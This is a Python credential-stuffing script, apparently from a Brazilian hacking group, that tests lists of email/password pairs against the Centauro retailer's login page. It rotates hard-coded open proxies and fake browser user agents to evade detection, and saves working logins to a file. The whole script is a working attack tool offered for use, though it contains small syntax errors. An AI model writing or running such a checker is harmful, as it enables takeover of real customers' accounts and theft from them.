## Autor: Ang33l
## Python 3
## Testador de contas Centauro!
## Greetz > B33CK - D3Z3N0V3 - V4P0R - CATER - CNX - BISCOITO

import json
import requests
import os
import random

lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')

print("""







  _____           _                               _____ _               _             
 / ____|         | |                             / ____| |             | |            
| |     ___ _ __ | |_ __ _ _   _ _ __ ___ ______| |    | |__   ___  ___| | _____ _ __ 
| |    / _ \ '_ \| __/ _` | | | | '__/ _ \______| |    | '_ \ / _ \/ __| |/ / _ \ '__|
| |___|  __/ | | | || (_| | |_| | | | (_) |     | |____| | | |  __/ (__|   <  __/ |   
 \_____\___|_| |_|\__\__,_|\__,_|_|  \___/       \_____|_| |_|\___|\___|_|\_\___|_|   

	Autor: Ang33l
	Greetz: Tropa Do Cenora ~ Biscoito  
                                                                                     





	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]
for linha in lista:
	user_agent = random.choice(['Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
	'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)'
	'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
	'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
	'Opera/9.20 (Windows NT 6.0; U; en)',
	'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
	'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
	'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)'])
	https_proxy = random.choice(['https://187.75.217.165:3128', 'https://177.36.15.17:8081', 'https://200.146.77.133:80', 'https://186.215.148.228:80', 'https://187.44.1.167:8080', 'https://200.180.112.2:3128', 'https://200.150.96.130:3128', 'https://200.146.77.134:80', 'https://187.32.93.234:80'])
	proxyDict = {
			"https"	:  https_proxy

		         }
	dados = linha.split(separa)
	url = 'https://www.centauro.com.br/slogin'
	payload = {'Login': dados[0], 'Senha': dados[1]}
	headers = {'User-Agent' user_agent}
	r = requests.post(url, headers=headers, proxies=proxyDict, data=payload).text
	if r.find("E-mail ou CPF/CNPJ inválido") == -1:
		print("Live --> {}|{}".format(dados[0],dados[1]))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))
	else:
		print("Die --> {}|{}".format(dados[0],dados[1]))

